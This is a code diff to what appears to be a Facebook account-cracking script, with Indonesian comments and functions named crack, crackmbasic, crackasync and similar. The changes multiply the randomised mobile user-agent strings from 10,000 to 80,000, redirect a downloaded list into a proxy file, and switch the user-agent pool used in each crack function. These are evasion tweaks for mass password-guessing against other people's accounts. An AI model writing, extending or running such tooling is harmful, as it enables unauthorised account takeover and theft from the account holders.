@@ -73,7 +73,7 @@ except Exception as e:
 	print('[\x1b[1;92m•\x1b[1;97m] [\x1b[1;96mNolepXx')
 prox=open('.prox.txt','r').read().splitlines()
 limitd=0
-for agenkuw in range(10000):
+for agenkuw in range(80000):
 	a='Mozilla/5.0 (Linux; Android'
 	b=random.choice(['8.1.0','9','10','11','12'])
 	c='CPH2109'
@@ -810,7 +810,7 @@ for agenkuw in range(10000):
 	l='UCBrowser/11.4.8.1012 Mobile Safari/537.36'
 	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
 	uaa.append(uaku2)
-for t in range(10000):
+for t in range(80000):
     a=random.choice(['3','4','5','6','7','8','9','10','11','12','13'])
     b=random.randrange(111111,210000)
     c=random.randrange(73,100)
@@ -822,7 +822,7 @@ for t in range(10000):
     uaa.append(XILL)
 
 #------------[ UBAH UA DIH SINI OM ]---------------#
-for t in range(10000):
+for t in range(80000):
 	a=random.choice(['1','1.0','1.5','2','2.0','2.5','3','3.0','3.5','4','4.0','4.5','5','5.0','5.5','6','6.0','6.5','7','7.0','7.5','8','8.0','8.5','9','9.0','9.5','10','10.0','10.5','11','11.0','11.5','12','12.0','12.5','13'])
 	b=random.choice(['OPM1','TP1A','RP1A','PPR1','PKQ1','QP1A','SP1A','RKQ1'])
 	c=random.randrange(111111,210000)
@@ -867,11 +867,11 @@ def uaku():
 			ugen.append(ub)
 	except:
 		a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
-		ua=open('.bbnew.txt','w')
+		ua=open('.prox.txt','w')
 		aa=re.findall('line">(.*?)<',str(a))
 		for un in aa:
 			ua.write(un+'\n')
-		ua=open('.bbnew.txt','r').read().splitlines()
+		ua=open('.prox.txt','r').read().splitlines()
 ###----------[ WARNA PRINT RICH ]---------- ###
 M2 = "[#FF0000]" # MERAH
 H2 = "[#00FF00]" # HIJAU
@@ -2055,7 +2055,7 @@ def crack(idf,pwv):
 	global loop,ok,cp
 	bo = random.choice([m,k,h,b,u,x])
 	ua = random.choice(ugen)
-	ua2 = random.choice(ugen2)
+	ua2 = random.choice(uaa)
 	ses = requests.Session()
 	prog.update(des,description=f"{h}Mobile{x} {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
 	prog.advance(des) 
@@ -2100,7 +2100,7 @@ def crackmobilev2(idf,pwv):
 	global loop,ok,cp
 	bo = random.choice([m,k,h,b,u,x])
 	ua = random.choice(ugen)
-	ua2 = random.choice(ugen2)
+	ua2 = random.choice(uaa)
 	ses = requests.Session()
 	prog.update(des,description=f"{h}Mbeta{x} {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
 	prog.advance(des) 
@@ -2145,7 +2145,7 @@ def crackmbasic(idf,pwv):
 	global loop,ok,cp
 	bo = random.choice([m,k,h,b,u,x])
 	ua = random.choice(ugen)
-	ua2 = random.choice(ugen2)
+	ua2 = random.choice(uaa)
 	ses = requests.Session()
 	prog.update(des,description=f"{h}Mbasic{x} {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
 	prog.advance(des) 
@@ -2190,7 +2190,7 @@ def crackfree(idf,pwv):
 	global loop,ok,cp
 	bo = random.choice([m,k,h,b,u,x])
 	ua = random.choice(ugen)
-	ua2 = random.choice(ugen2)
+	ua2 = random.choice(uaa)
 	ses = requests.Session()
 	prog.update(des,description=f"{h}B-Api{x} {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
 	prog.advance(des) 
@@ -2251,7 +2251,7 @@ def crackasync(idf,pwv):
 	global loop,ok,cp
 	bo = random.choice([m,k,h,b,u,x])
 	ua = random.choice(ugen)
-	ua2 = random.choice(ugen2)
+	ua2 = random.choice(uaa)
 	ses = requests.Session()
 	prog.update(des,description=f"{h}Async{x} {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
 	prog.advance(des) 
@@ -2315,7 +2315,7 @@ def crackreguler(idf,pwv):
 	global loop,ok,cp
 	bo = random.choice([m,k,h,b,u,x])
 	ua = random.choice(ugen)
-	ua2 = random.choice(ugen2)
+	ua2 = random.choice(uaa)
 	ses = requests.Session()
 	prog.update(des,description=f"{h}Reguler{x} {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
 	prog.advance(des) 
